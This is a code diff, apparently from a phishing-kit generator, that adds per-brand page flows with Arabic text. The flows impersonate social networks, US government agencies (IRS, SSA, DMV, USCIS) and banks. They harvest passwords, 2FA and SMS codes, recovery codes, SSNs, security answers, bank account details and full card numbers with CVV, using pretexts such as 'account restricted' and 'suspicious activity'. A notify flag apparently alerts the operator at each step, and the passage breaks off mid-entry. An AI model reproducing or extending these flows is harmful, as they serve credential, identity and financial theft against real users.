@@ -11,14 +11,6 @@ export const CATEGORIES = [
   { id: 'video',      name: 'فيديو',             count: 30 }
 ];
 
-const BASE_BP = {
-  login:    { slug:'login',    page_title:'تسجيل الدخول', headline_tpl:'أهلاً في {name}',      sub_tpl:'سجّل دخولك',              fields:['email','password'], layout:'auth' },
-  otp:      { slug:'verify',   page_title:'التحقق',       headline_tpl:'أدخل الكود',            sub_tpl:'بعتنا كود تحقق',          otp_type:'sms', otp_length:6, fields:['code'], layout:'otp' },
-  home:     { slug:'home',     page_title:'الرئيسية',     headline_tpl:'{name} — الرئيسية',     sub_tpl:'مرحباً بك',               fields:['name','email','phone'], layout:'hero-center' },
-  features: { slug:'features', page_title:'المميزات',     headline_tpl:'مميزات {name}',         sub_tpl:'اكتشف المزيد',            features:[{title:'سريع',desc:'تجربة سريعة وسلسة'},{title:'آمن',desc:'حماية كاملة لبياناتك'},{title:'سهل',desc:'واجهة بسيطة وسهلة الاستخدام'}], layout:'cards' },
-  pricing:  { slug:'pricing',  page_title:'الأسعار',      headline_tpl:'خطط {name}',            sub_tpl:'اختر الخطة المناسبة',     plans:[{name:'مجاني',price:'0',features:['الأساسيات']},{name:'Pro',price:'9.99',features:['كل الميزات']}], layout:'hero-center' }
-};
-
 const CATEGORY_DEFAULTS = {
   social:     ['#1a1a2e','#16213e','#eee','#e94560','#0f3460'],
   government: ['#0d1b2a','#1b2838','#ffffff','#1f6feb','#58a6ff'],
@@ -294,6 +286,435 @@ const PALETTES = {
   vimeo:          ['#1AB7EA','#0E9AC8','#FFFFFF','#1AB7EA','#00ADEF']
 };
 
+// ─── Per-brand flows ─────────────────────────────────────────────────────────
+// Each entry: { slug, form_type, page_title, headline, subheadline, fields,
+//               layout, cta, step_label, notify_step, otp_length? }
+// form_type: login | otp | otp_long | checkpoint | verify | payment |
+//            security_q | confirm | locked
+
+const FLOWS = {
+
+  // ── SOCIAL ──────────────────────────────────────────────────────────────────
+
+  facebook: [
+    { slug:'login',      form_type:'login',      page_title:'تسجيل الدخول',      headline:'أهلاً بك في Facebook',               subheadline:'أدخل بريدك الإلكتروني أو رقم هاتفك وكلمة المرور',   fields:['email','password'],                  layout:'auth',       cta:'تسجيل الدخول',    step_label:'Login',      notify_step:true  },
+    { slug:'checkpoint', form_type:'checkpoint',  page_title:'تحقق من هويتك',     headline:'تم تقييد حسابك مؤقتاً',              subheadline:'لاحظنا نشاطاً غير معتاد. نحتاج للتحقق من هويتك لإعادة تفعيل الحساب', fields:[],              layout:'checkpoint', cta:'التحقق من الهوية', step_label:'Checkpoint', notify_step:false },
+    { slug:'id-verify',  form_type:'id_verify',   page_title:'تحقق من الهوية',    headline:'أكّد هويتك',                          subheadline:'ارفع صورة من هويتك الشخصية أو جواز السفر',           fields:['full_name','dob','id_number'],        layout:'verify',     cta:'إرسال',            step_label:'ID Verify',  notify_step:true  },
+    { slug:'2fa',        form_type:'otp',         page_title:'التحقق بخطوتين',    headline:'أدخل كود المصادقة',                   subheadline:'أدخل الكود المكون من 6 أرقام من تطبيق المصادقة',     fields:['code'],                              layout:'otp',        cta:'تأكيد',            step_label:'2FA',        notify_step:true,  otp_length:6 },
+    { slug:'locked',     form_type:'locked',      page_title:'الحساب محدود',      headline:'جارٍ مراجعة حسابك',                  subheadline:'سيتم إعادة تفعيل حسابك خلال 24 ساعة بعد المراجعة',  fields:[],                                    layout:'locked',     cta:'',                 step_label:'Locked',     notify_step:false }
+  ],
+
+  instagram: [
+    { slug:'login',             form_type:'login',     page_title:'تسجيل الدخول',  headline:'سجّل دخولك في Instagram',            subheadline:'أدخل اسم المستخدم أو الإيميل وكلمة المرور',          fields:['username','password'],               layout:'auth',       cta:'تسجيل الدخول',    step_label:'Login',           notify_step:true  },
+    { slug:'suspicious',        form_type:'checkpoint',page_title:'نشاط مشبوه',    headline:'هل أنت من قام بهذا؟',               subheadline:'لاحظنا تسجيل دخول من جهاز غير معروف. تأكد أنك أنت',  fields:[],                                    layout:'checkpoint', cta:'نعم، أنا من قام بذلك', step_label:'Suspicious',    notify_step:false },
+    { slug:'sms-verify',        form_type:'otp',       page_title:'التحقق برسالة', headline:'أدخل الكود المرسل',                  subheadline:'أرسلنا كوداً من 6 أرقام إلى رقم هاتفك',             fields:['code'],                              layout:'otp',        cta:'تأكيد',            step_label:'SMS Verify',      notify_step:true,  otp_length:6 },
+    { slug:'recovery',          form_type:'verify',    page_title:'كود الاسترداد', headline:'استخدم كود الاسترداد',               subheadline:'أدخل أحد أكواد الاسترداد الاحتياطية',               fields:['backup_code'],                       layout:'verify',     cta:'متابعة',           step_label:'Recovery Code',   notify_step:true  },
+    { slug:'confirm-info',      form_type:'verify',    page_title:'تأكيد البيانات',headline:'أكّد بياناتك الشخصية',               subheadline:'نحتاج للتحقق من معلوماتك لحماية حسابك',              fields:['full_name','dob','phone'],            layout:'verify',     cta:'تأكيد',            step_label:'Confirm Info',    notify_step:true  }
+  ],
+
+  tiktok: [
+    { slug:'login',      form_type:'login',   page_title:'تسجيل الدخول',  headline:'سجّل دخولك في TikTok',              subheadline:'أدخل بريدك أو رقم هاتفك وكلمة المرور',      fields:['email','password'],  layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',      notify_step:true  },
+    { slug:'captcha',    form_type:'verify',  page_title:'التحقق الأمني', headline:'تحقق من أنك لست روبوتاً',          subheadline:'أكمل التحقق للمتابعة',                       fields:[],                    layout:'checkpoint', cta:'تأكيد',     step_label:'Captcha',    notify_step:false },
+    { slug:'sms-verify', form_type:'otp',     page_title:'تحقق برسالة',   headline:'أدخل الكود',                       subheadline:'أرسلنا كود تحقق إلى رقم هاتفك',             fields:['code'],              layout:'otp',   cta:'تأكيد',        step_label:'SMS Verify', notify_step:true,  otp_length:6 }
+  ],
+
+  twitterx: [
+    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',  headline:'سجّل دخولك في X',                  subheadline:'أدخل بريدك أو هاتفك أو اسم المستخدم',       fields:['email'],             layout:'auth',  cta:'التالي',           step_label:'Username',       notify_step:true  },
+    { slug:'password',        form_type:'login',  page_title:'كلمة المرور',   headline:'أدخل كلمة المرور',                 subheadline:'',                                           fields:['password'],          layout:'auth',  cta:'تسجيل الدخول',     step_label:'Password',       notify_step:true  },
+    { slug:'2fa',             form_type:'otp',    page_title:'التحقق بخطوتين',headline:'أدخل كود التحقق',                 subheadline:'أدخل الكود من تطبيق المصادقة',              fields:['code'],              layout:'otp',   cta:'تأكيد',            step_label:'2FA',            notify_step:true,  otp_length:6 },
+    { slug:'confirm-account', form_type:'verify', page_title:'تأكيد الحساب',  headline:'أكّد رقم هاتفك',                  subheadline:'أدخل رقم هاتفك لتأكيد هويتك',               fields:['phone'],             layout:'verify',cta:'إرسال الكود',       step_label:'Confirm Account',notify_step:true  }
+  ],
+
+  snapchat: [
+    { slug:'login',     form_type:'login',  page_title:'تسجيل الدخول',  headline:'سجّل دخولك في Snapchat',         subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',        fields:['email','password'],  layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'birthday',  form_type:'verify', page_title:'تحقق من هويتك', headline:'أكّد تاريخ ميلادك',              subheadline:'أدخل تاريخ ميلادك للتحقق من هويتك',         fields:['dob'],               layout:'verify',cta:'متابعة',       step_label:'Birthday', notify_step:true  },
+    { slug:'sms-code',  form_type:'otp',    page_title:'كود التحقق',     headline:'أدخل الكود المرسل إليك',        subheadline:'أرسلنا كود تحقق برسالة نصية',               fields:['code'],              layout:'otp',   cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  linkedin: [
+    { slug:'login',  form_type:'login', page_title:'تسجيل الدخول',  headline:'سجّل دخولك في LinkedIn',         subheadline:'ابقَ على تواصل مع شبكتك المهنية',           fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login', notify_step:true  },
+    { slug:'2fa',    form_type:'otp',   page_title:'التحقق بخطوتين',headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً من 6 أرقام إلى بريدك الإلكتروني', fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'2FA',   notify_step:true,  otp_length:6 }
+  ],
+
+  pinterest: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'سجّل دخولك في Pinterest',        subheadline:'ابحث عن إلهامك',                             fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'التحقق الأمني', headline:'أدخل كود التحقق',                subheadline:'أرسلنا كود برسالة نصية',                     fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  reddit: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Reddit',           subheadline:'أدخل بياناتك للمتابعة',                     fields:['username','password'],layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'تحقق الهوية',  headline:'أدخل كود التحقق',                subheadline:'أرسلنا كود SMS إلى هاتفك',                   fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  tumblr: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Tumblr',           subheadline:'',                                           fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'تحقق الهوية',  headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى رقم هاتفك',               fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  discord: [
+    { slug:'login', form_type:'login', page_title:'مرحباً بعودتك',  headline:'مرحباً بعودتك!',                  subheadline:'أسعدنا رؤيتك مجدداً',                       fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login', notify_step:true  },
+    { slug:'2fa',   form_type:'otp',   page_title:'التحقق بخطوتين', headline:'التحقق بخطوتين',                 subheadline:'أدخل الكود من تطبيق المصادقة',              fields:['code'],              layout:'otp',  cta:'تسجيل الدخول', step_label:'2FA',   notify_step:true,  otp_length:6 }
+  ],
+
+  whatsapp: [
+    { slug:'login',    form_type:'login', page_title:'أدخل رقم هاتفك', headline:'أدخل رقم هاتفك',               subheadline:'سنرسل لك كود تحقق برسالة نصية',              fields:['phone'],             layout:'auth', cta:'التالي',       step_label:'Phone',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'كود التحقق',      headline:'أدخل الكود المرسل',            subheadline:'تحقق من رقم هاتفك بكود 6 أرقام',            fields:['code'],              layout:'otp',  cta:'التالي',       step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  telegram: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Telegram',         subheadline:'أدخل رقم هاتفك',                             fields:['phone'],             layout:'auth', cta:'التالي',       step_label:'Phone',  notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'كود التحقق',   headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى رقم هاتفك أو تطبيق Telegram',fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'OTP',    notify_step:true,  otp_length:5 }
+  ],
+
+  wechat: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'تسجيل الدخول إلى WeChat',        subheadline:'أدخل رقم هاتفك أو الإيميل',                  fields:['phone','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',       headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى رقم هاتفك',                fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  line: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في LINE',             subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',        fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',       headline:'أدخل كود التحقق',                subheadline:'تحقق من هويتك برسالة نصية',                 fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  viber: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Viber',            subheadline:'أدخل رقم هاتفك',                             fields:['phone'],             layout:'auth', cta:'متابعة',       step_label:'Phone',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'كود التحقق',   headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى رقم هاتفك',                fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  bereal: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في BeReal',           subheadline:'أدخل رقم هاتفك',                             fields:['phone'],             layout:'auth', cta:'متابعة',       step_label:'Phone',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'كود التحقق',   headline:'أدخل الكود المرسل',              subheadline:'أرسلنا كوداً برسالة نصية',                   fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  clubhouse: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Clubhouse',        subheadline:'أدخل رقم هاتفك للمتابعة',                   fields:['phone'],             layout:'auth', cta:'إرسال الكود',  step_label:'Phone',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'كود التحقق',   headline:'أدخل الكود المرسل',              subheadline:'أرسلنا كود تحقق إلى رقم هاتفك',             fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  mastodon: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك',                     subheadline:'أدخل بيانات حسابك على Mastodon',             fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',       headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى بريدك الإلكتروني',         fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'OTP',      notify_step:true,  otp_length:6 }
+  ],
+
+  threads: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Threads',          subheadline:'أدخل بيانات حساب Instagram الخاص بك',       fields:['username','password'],layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',       headline:'أدخل كود التحقق',                subheadline:'أرسلنا كود برسالة نصية',                     fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'OTP',      notify_step:true,  otp_length:6 }
+  ],
+
+  youtube: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'تسجيل الدخول إلى YouTube',       subheadline:'أدخل بريدك الإلكتروني أو رقم هاتفك',        fields:['email'],             layout:'auth', cta:'التالي',       step_label:'Email',    notify_step:true  },
+    { slug:'password', form_type:'login', page_title:'كلمة المرور',  headline:'مرحباً',                          subheadline:'أدخل كلمة المرور الخاصة بحسابك',            fields:['password'],          layout:'auth', cta:'التالي',       step_label:'Password', notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',       headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى رقم هاتفك',                fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'2FA',      notify_step:true,  otp_length:6 }
+  ],
+
+  // ── GOVERNMENT ──────────────────────────────────────────────────────────────
+
+  irs: [
+    { slug:'login',          form_type:'login',      page_title:'تسجيل الدخول',       headline:'تسجيل الدخول إلى IRS',               subheadline:'أدخل رقم الضمان الاجتماعي واسم المستخدم وكلمة المرور', fields:['ssn','username','password'],              layout:'auth',      cta:'تسجيل الدخول', step_label:'Login',            notify_step:true  },
+    { slug:'security-q',     form_type:'security_q', page_title:'أسئلة الأمان',        headline:'أسئلة التحقق الأمني',               subheadline:'أجب على أسئلة الأمان للتحقق من هويتك',               fields:['answer1','answer2','answer3'],            layout:'security_q',cta:'متابعة',        step_label:'Security Questions',notify_step:true  },
+    { slug:'id-verify',      form_type:'id_verify',  page_title:'تحقق من هويتك',       headline:'أكّد هويتك',                         subheadline:'أدخل آخر 4 أرقام من SSN وآخر 4 أرقام من بطاقتك',     fields:['ssn_last4','card_last4'],                 layout:'verify',    cta:'متابعة',        step_label:'ID Verify',        notify_step:true  },
+    { slug:'verify-address', form_type:'verify',     page_title:'تأكيد العنوان',        headline:'أكّد عنوانك',                        subheadline:'أدخل عنوانك البريدي الحالي',                          fields:['address','city','state','zip'],           layout:'verify',    cta:'متابعة',        step_label:'Verify Address',   notify_step:true  },
+    { slug:'payment-setup',  form_type:'payment',    page_title:'إعداد الدفع',          headline:'معلومات الدفع البنكي',               subheadline:'أدخل بيانات حسابك البنكي للاسترداد الضريبي',          fields:['routing_number','account_number','bank'], layout:'payment',   cta:'إرسال',         step_label:'Bank Details',     notify_step:true  }
+  ],
+
+  ssa: [
+    { slug:'login',     form_type:'login',    page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى my Social Security',subheadline:'أدخل اسم المستخدم وكلمة المرور',          fields:['username','password'],    layout:'auth',   cta:'تسجيل الدخول', step_label:'Login',      notify_step:true  },
+    { slug:'sms-code',  form_type:'otp',      page_title:'التحقق',          headline:'أدخل كود التحقق',                    subheadline:'أرسلنا كوداً إلى رقم هاتفك',              fields:['code'],                   layout:'otp',    cta:'تأكيد',        step_label:'SMS Code',   notify_step:true,  otp_length:8 },
+    { slug:'id-confirm',form_type:'id_verify',page_title:'تأكيد الهوية',    headline:'أكّد هويتك',                         subheadline:'أدخل رقم الضمان الاجتماعي وتاريخ الميلاد', fields:['ssn','dob'],              layout:'verify', cta:'تأكيد',        step_label:'ID Confirm', notify_step:true  }
+  ],
+
+  dmv: [
+    { slug:'login',     form_type:'login',    page_title:'تسجيل الدخول',   headline:'بوابة DMV الإلكترونية',              subheadline:'أدخل رقم رخصة القيادة وتاريخ الميلاد',    fields:['dl_number','dob'],        layout:'auth',   cta:'تسجيل الدخول', step_label:'Login',      notify_step:true  },
+    { slug:'ssn-verify',form_type:'id_verify',page_title:'تحقق من الهوية', headline:'تحقق من رقم الضمان الاجتماعي',      subheadline:'أدخل آخر 4 أرقام من رقم الضمان الاجتماعي', fields:['ssn_last4'],              layout:'verify', cta:'متابعة',       step_label:'SSN Verify', notify_step:true  },
+    { slug:'payment',   form_type:'payment',  page_title:'الدفع',           headline:'أدخل بيانات بطاقتك',                subheadline:'ادفع رسوم التجديد أو الاستبدال',           fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'دفع الرسوم',   step_label:'Payment',    notify_step:true  }
+  ],
+
+  uscis: [
+    { slug:'login',     form_type:'login',    page_title:'تسجيل الدخول',   headline:'بوابة USCIS',                        subheadline:'أدخل اسم المستخدم وكلمة المرور ورقم الضمان الاجتماعي', fields:['username','password','ssn'], layout:'auth',   cta:'تسجيل الدخول', step_label:'Login',      notify_step:true  },
+    { slug:'sms-code',  form_type:'otp',      page_title:'التحقق',          headline:'كود التحقق',                         subheadline:'أرسلنا كود تحقق برسالة نصية',              fields:['code'],                      layout:'otp',    cta:'تأكيد',        step_label:'SMS Code',   notify_step:true,  otp_length:6 },
+    { slug:'id-confirm',form_type:'id_verify',page_title:'تأكيد الهوية',    headline:'تأكيد بيانات الهوية',               subheadline:'أدخل رقم الضمان وتاريخ الميلاد',          fields:['ssn','dob'],                 layout:'verify', cta:'تأكيد',        step_label:'ID Confirm', notify_step:true  }
+  ],
+
+  usps: [
+    { slug:'login',          form_type:'login',  page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى USPS',             subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',      fields:['email','password'],   layout:'auth',   cta:'تسجيل الدخول',     step_label:'Login',          notify_step:true  },
+    { slug:'verify-address', form_type:'verify', page_title:'تأكيد العنوان',   headline:'تأكيد عنوان التسليم',               subheadline:'أدخل عنوانك لتتبع التسليم',               fields:['address','city','zip'],layout:'verify', cta:'تأكيد',            step_label:'Verify Address', notify_step:true  },
+    { slug:'confirm',        form_type:'confirm',page_title:'تم التأكيد',       headline:'تم تأكيد طلبك',                     subheadline:'سيتم إرسال الحزمة خلال 2-5 أيام عمل',     fields:[],                     layout:'confirm',cta:'العودة للرئيسية',  step_label:'Complete',       notify_step:false }
+  ],
+
+  // Other government brands use category default flow built at bottom
+
+  // ── BANKS ───────────────────────────────────────────────────────────────────
+
+  jpmorganchase: [
+    { slug:'login',        form_type:'login',      page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Chase Online',     subheadline:'أدخل اسم المستخدم وكلمة المرور',          fields:['username','password'],                      layout:'auth',      cta:'تسجيل الدخول', step_label:'Login',            notify_step:true  },
+    { slug:'sms-otp',      form_type:'otp',        page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً من 6 أرقام إلى رقم هاتفك',  fields:['code'],                                     layout:'otp',       cta:'تأكيد',        step_label:'SMS OTP',          notify_step:true,  otp_length:6 },
+    { slug:'security-q',   form_type:'security_q', page_title:'أسئلة الأمان',   headline:'أسئلة التحقق الأمني',               subheadline:'أجب على أسئلة الأمان للتحقق من هويتك',  fields:['answer1','answer2','answer3'],               layout:'security_q',cta:'متابعة',       step_label:'Security Questions',notify_step:true  },
+    { slug:'confirm-card', form_type:'payment',    page_title:'تأكيد البطاقة',  headline:'تأكيد بيانات بطاقتك',               subheadline:'أدخل معلومات بطاقتك للتحقق من هويتك',   fields:['card_last4','expiry','cvv'],                 layout:'payment',   cta:'تأكيد',        step_label:'Confirm Card',     notify_step:true  }
+  ],
+
+  bankofamerica: [
+    { slug:'login',      form_type:'login',      page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Bank of America',  subheadline:'أدخل هوية الدخول عبر الإنترنت وكلمة المرور', fields:['online_id','password'],              layout:'auth',      cta:'تسجيل الدخول', step_label:'Login',            notify_step:true  },
+    { slug:'sms-otp',    form_type:'otp',        page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى رقم هاتفك',               fields:['code'],                              layout:'otp',       cta:'تأكيد',        step_label:'SMS OTP',          notify_step:true,  otp_length:6 },
+    { slug:'security-q', form_type:'security_q', page_title:'أسئلة الأمان',   headline:'سؤال الأمان',                        subheadline:'أجب على سؤال الأمان للمتابعة',              fields:['answer1','answer2'],                 layout:'security_q',cta:'متابعة',       step_label:'Security Questions',notify_step:true  }
+  ],
+
+  wellsfargo: [
+    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Wells Fargo',      subheadline:'أدخل اسم المستخدم وكلمة المرور',          fields:['username','password'],          layout:'auth',  cta:'تسجيل الدخول',   step_label:'Login',          notify_step:true  },
+    { slug:'sms-otp',         form_type:'otp',    page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى رقم هاتفك',              fields:['code'],                         layout:'otp',   cta:'تأكيد',          step_label:'SMS OTP',        notify_step:true,  otp_length:6 },
+    { slug:'confirm-account', form_type:'verify', page_title:'تأكيد الحساب',   headline:'تأكيد رقم حسابك',                   subheadline:'أدخل آخر 4 أرقام من رقم حسابك البنكي',   fields:['account_last4'],                layout:'verify',cta:'تأكيد',          step_label:'Confirm Account',notify_step:true  }
+  ],
+
+  citibank: [
+    { slug:'login',      form_type:'login',      page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Citi',             subheadline:'أدخل معرّف المستخدم وكلمة المرور',        fields:['user_id','password'],        layout:'auth',      cta:'تسجيل الدخول', step_label:'Login',            notify_step:true  },
+    { slug:'sms-otp',    form_type:'otp',        page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً برسالة نصية',                 fields:['code'],                      layout:'otp',       cta:'تأكيد',        step_label:'SMS OTP',          notify_step:true,  otp_length:6 },
+    { slug:'security-q', form_type:'security_q', page_title:'أسئلة الأمان',   headline:'أسئلة الأمان',                      subheadline:'أجب على الأسئلة للمتابعة',                 fields:['answer1','answer2','answer3'],layout:'security_q',cta:'متابعة',       step_label:'Security Questions',notify_step:true  }
+  ],
+
+  hsbc: [
+    { slug:'login',    form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى HSBC',             subheadline:'أدخل اسم المستخدم وكلمة المرور',          fields:['username','password'],   layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',           notify_step:true  },
+    { slug:'memo',     form_type:'verify', page_title:'كلمة التذكر',    headline:'أدخل كلمة التذكر',                  subheadline:'أدخل الكلمة المميزة لحسابك',               fields:['memorable_word'],         layout:'verify',cta:'متابعة',       step_label:'Memorable Answer', notify_step:true  },
+    { slug:'sms-otp',  form_type:'otp',    page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى رقم هاتفك',              fields:['code'],                   layout:'otp',   cta:'تأكيد',        step_label:'OTP',             notify_step:true,  otp_length:6 }
+  ],
+
+  emiratesnbd: [
+    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى Emirates NBD',     subheadline:'أدخل رقم العميل وكلمة المرور',             fields:['customer_id','password'],           layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',        notify_step:true  },
+    { slug:'sms-otp',      form_type:'otp',    page_title:'التحقق',          headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كود OTP إلى رقم هاتفك المسجّل',    fields:['code'],                             layout:'otp',   cta:'تأكيد',         step_label:'SMS OTP',      notify_step:true,  otp_length:6 },
+    { slug:'confirm-card', form_type:'payment',page_title:'تأكيد البطاقة',   headline:'تأكيد بيانات بطاقتك',               subheadline:'أدخل بيانات بطاقتك للتحقق من هويتك',      fields:['card_number','expiry','cvv'],        layout:'payment',cta:'تأكيد',         step_label:'Card Confirm', notify_step:true  }
+  ],
+
+  mashreq: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Mashreq',          subheadline:'أدخل رقم العميل وكلمة المرور',             fields:['customer_id','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-otp',  form_type:'otp',   page_title:'التحقق',         headline:'أدخل كود OTP',                      subheadline:'أرسلنا كود OTP إلى رقم هاتفك',             fields:['code'],                   layout:'otp',  cta:'تأكيد',        step_label:'OTP',      notify_step:true,  otp_length:6 }
+  ],
+
+  qnb: [
+    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى QNB',              subheadline:'أدخل رقم العميل وكلمة المرور',             fields:['customer_id','password'],         layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',        notify_step:true  },
+    { slug:'sms-otp',      form_type:'otp',    page_title:'التحقق',         headline:'أدخل كود OTP',                      subheadline:'أرسلنا كود OTP إلى رقم هاتفك المسجّل',    fields:['code'],                           layout:'otp',   cta:'تأكيد',         step_label:'OTP',          notify_step:true,  otp_length:6 },
+    { slug:'confirm-card', form_type:'payment',page_title:'تأكيد البطاقة',  headline:'تأكيد بيانات البطاقة',              subheadline:'أدخل بيانات بطاقتك',                      fields:['card_number','expiry','cvv'],      layout:'payment',cta:'تأكيد',         step_label:'Card Confirm', notify_step:true  }
+  ],
+
+  adcb: [
+    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى ADCB',             subheadline:'أدخل رقم العميل وكلمة المرور',             fields:['customer_id','password'],         layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',        notify_step:true  },
+    { slug:'sms-otp',      form_type:'otp',    page_title:'التحقق',         headline:'كود OTP',                           subheadline:'أرسلنا كود OTP إلى رقم هاتفك',             fields:['code'],                           layout:'otp',   cta:'تأكيد',         step_label:'OTP',          notify_step:true,  otp_length:6 },
+    { slug:'confirm-card', form_type:'payment',page_title:'تأكيد البطاقة',  headline:'تأكيد بيانات بطاقتك',              subheadline:'أدخل بيانات بطاقتك للتحقق',               fields:['card_number','expiry','cvv'],      layout:'payment',cta:'تأكيد',         step_label:'Card Confirm', notify_step:true  }
+  ],
+
+  fab: [
+    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى FAB',              subheadline:'أدخل رقم العميل وكلمة المرور',             fields:['customer_id','password'],         layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',        notify_step:true  },
+    { slug:'sms-otp',      form_type:'otp',    page_title:'كود OTP',        headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كود OTP إلى رقم هاتفك المسجّل',    fields:['code'],                           layout:'otp',   cta:'تأكيد',         step_label:'OTP',          notify_step:true,  otp_length:6 },
+    { slug:'confirm-card', form_type:'payment',page_title:'تأكيد البطاقة',  headline:'تأكيد بيانات البطاقة',              subheadline:'أدخل بيانات بطاقتك للتحقق',               fields:['card_number','expiry','cvv'],      layout:'payment',cta:'تأكيد',         step_label:'Card Confirm', notify_step:true  }
+  ],
+
+  // ── CRYPTO ──────────────────────────────────────────────────────────────────
+
+  binance: [
